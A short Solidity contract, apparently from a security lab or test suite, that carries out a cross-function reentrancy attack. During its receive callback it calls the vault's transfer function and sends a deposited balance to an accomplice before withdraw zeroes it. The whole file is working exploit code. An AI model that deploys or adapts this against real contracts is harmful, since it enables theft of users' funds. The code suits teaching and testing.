// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVaultCross {
    function deposit() external payable;
    function withdraw() external;
    function transfer(address to, uint256 amount) external;
    function balances(address) external view returns (uint256);
}

contract CrossFunctionAttacker {
    IVaultCross public immutable vault;
    address public immutable accomplice;
    uint256 public attackAmount;

    constructor(address _vault, address _accomplice) {
        vault = IVaultCross(_vault);
        accomplice = _accomplice;
    }

    function attack(uint256 amount) external {
        attackAmount = amount;
        vault.deposit{value: amount}();
        vault.withdraw();
    }

    receive() external payable {
        if (attackAmount > 0) {
            uint256 amount = attackAmount;
            attackAmount = 0; // one-shot
            vault.transfer(accomplice, amount); // bypasses the local guard
        }
    }
}
